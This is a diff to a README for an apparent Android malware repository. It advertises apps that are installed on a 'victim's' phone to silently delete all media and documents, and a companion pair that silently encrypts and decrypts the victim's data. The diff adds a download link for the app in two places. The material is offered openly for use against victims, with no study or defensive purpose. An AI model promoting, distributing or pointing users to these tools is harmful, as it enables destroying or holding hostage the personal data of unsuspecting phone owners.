@@ -1,4 +1,7 @@
 # Data-Delete-App-
+App link
+https://mega.nz/file/Ayh2GShB#MS6W9-Ob9YYUkW-KKCzB-g4oBtjn76BTNMJ-QSU1_98
+
 This Dangerous Android Application Can Be Installed On Your Victim's Mobile Then
 The Data Of Your Victim's Mobile(Include All Data: Like: Pictures,
 Videos, Documents, Audios, etc) Can Be Deleted With Powerful Malicious Data Deleting
@@ -17,6 +20,8 @@ Once This Dangerous Android Application Can Be Installed On Your Victim's Mobile
 2:
 Data Encrypt Application
 Once This Dangerous Android Application Can Be Installed On Your Victim's Mobile Then The Data Of Your Victim's Mobile(Include All Data: Like: Pictures, Videos, Documents, Audios, etc) Can Be Encrypted With Strong Encryption Code Within Few Seconds Silently.
-3:
+3: 
 Data Decrypt Application
 This Application Is A Part Of Previous Applications(Data Encrypt Application).Once This Dangerous Android Application Can Installed On Victim's Mobile Then The Data Of Your Victim's Mobile(Include All Data: Like: Pictures, Videos, Documents, Audios, etc) Can Be Decrypt With The Base Of Previous Algorithms(Which Are Used To Encrypt Your Data)  Within Few Seconds Silently.
+App link
+https://mega.nz/file/Ayh2GShB#MS6W9-Ob9YYUkW-KKCzB-g4oBtjn76BTNMJ-QSU1_98
